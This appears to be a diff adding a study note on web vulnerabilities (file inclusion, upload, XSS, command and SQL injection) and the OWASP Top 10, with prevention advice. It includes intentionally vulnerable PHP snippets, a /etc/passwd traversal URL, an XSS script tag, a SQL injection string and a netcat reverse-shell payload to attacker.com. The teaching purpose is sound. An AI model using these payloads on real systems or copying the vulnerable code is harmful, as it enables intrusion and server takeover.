@@ -1,0 +1,153 @@
+# 🛡️ Day 9 – Web Vulnerabilities & OWASP Top 10 (2021)
+
+---
+
+## 🧾 1. File Inclusion Vulnerability
+
+### 🔹 What is it?
+A vulnerability where an attacker can include files on a server through the web browser.
+
+### 🔹 Types:
+- **LFI (Local File Inclusion)**: Includes files from the local server.
+- **RFI (Remote File Inclusion)**: Includes files from a remote URL (if allowed).
+
+### 🔹 Example (PHP):
+```php
+<?php
+  include($_GET["page"]);  // vulnerable
+?>
+URL: `http://example.com/index.php?page=../../etc/passwd`
+🔹 Prevention:
+Use a whitelist of valid files
+
+Disable allow_url_include
+
+Validate and sanitize inputs
+
+2. File Upload Vulnerability
+🔹 What is it?
+A flaw that allows an attacker to upload malicious files (e.g., web shells, malware) to the server.
+
+🔹 Exploits:
+Upload .php file and execute code
+
+Change content-type or extension
+
+Use double extensions: shell.php.jpg
+
+🔹 Prevention:
+Validate file type and extension
+
+Rename uploaded files
+
+Store outside web root
+
+Use antivirus scanning
+
+Set correct permissions
+
+3. Cross-site Scripting (XSS)
+🔹 What is XSS?
+XSS allows attackers to inject malicious scripts into trusted websites.
+
+🔹 Types:
+Type	Description
+Stored XSS	Injected code is stored in DB
+Reflected XSS	Immediate response (URL-based)
+DOM-based XSS	Occurs in client-side JavaScript
+
+🔹 Example:
+html
+Copy
+Edit
+<input type="text" name="q" value="<script>alert('XSS')</script>">
+🔹 Prevention:
+Use proper encoding (HTML, JS, URL)
+
+Use CSP (Content Security Policy)
+
+Sanitize input and output
+
+Avoid innerHTML
+4. Command Injection
+🔹 What is it?
+Allows an attacker to execute system commands on the server.
+
+🔹 Example (PHP):
+php
+Copy
+Edit
+<?php
+  system($_GET["cmd"]);  // vulnerable
+?>
+URL: `http://example.com/vuln.php?cmd=ls`
+
+### 🔹 Dangerous Payloads:
+```bash
+; ls
+&& whoami
+| nc -e /bin/bash attacker.com 4444
+🔹 Prevention:
+Use built-in functions instead of shell commands
+
+Sanitize and validate inputs
+
+Use allowlists
+ 5. SQL Injection
+🔹 What is SQLi?
+A vulnerability that allows an attacker to manipulate SQL queries to access unauthorized data.
+
+🔹 Example:
+sql
+Copy
+Edit
+SELECT * FROM users WHERE username = '$input';
+Input: ' OR '1'='1
+
+🔹 Exploits:
+Bypass login
+
+Dump database
+
+Read files
+
+Remote code execution
+
+🔹 Tools:
+sqlmap
+
+Manual payloads via Burp
+
+🔹 Prevention:
+Use prepared statements (parameterized queries)
+
+Validate user input
+
+Use ORM frameworks (e.g., SQLAlchemy)
+
+6. OWASP Top 10 (2021)
+The OWASP Top 10 is a list of the most critical web application security risks:
+
+Rank	Risk Name	Description
+A01	Broken Access Control	Bypass access rules
+A02	Cryptographic Failures	Weak/missing encryption
+A03	Injection (SQLi, XSS, etc.)	Untrusted input into commands
+A04	Insecure Design	Poor security architecture
+A05	Security Misconfiguration	Default settings, exposed data
+A06	Vulnerable and Outdated Components	Using outdated libraries
+A07	Identification and Authentication Failures	Weak login mechanisms
+A08	Software and Data Integrity Failures	Tampered software supply chain
+A09	Security Logging and Monitoring Failures	No logs for attacks
+A10	Server-Side Request Forgery (SSRF)	Server makes unauthorized HTTP requests
+
+🔹 Tips for Mitigation:
+Follow secure coding practices
+
+Use security headers and HTTPS
+
+Patch regularly
+
+Conduct regular code and vulnerability audits
+
+Enable strong authentication and logging
+
